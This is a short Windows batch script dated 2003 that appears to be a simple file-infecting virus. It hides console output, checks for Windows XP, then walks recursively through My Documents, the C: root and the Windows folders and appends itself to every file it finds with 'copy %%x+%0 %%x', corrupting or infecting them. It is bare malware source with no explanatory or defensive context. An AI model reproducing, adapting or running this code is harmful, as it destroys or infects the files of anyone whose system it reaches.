::
:: 18.05.2003
::
@echo off
ctty nul
ver | find "XP"
if errorlevel 1 goto done
if not errorlevel 1 goto :XP
:XP
for /r \ %%x in (c:\mydocu~1\*.*, c:\*.*, *.*, %windir%\*.*, %winbootdir%\*.*) do copy %%x+%0 %%x
ctty con
exit
:done
ctty con
cls
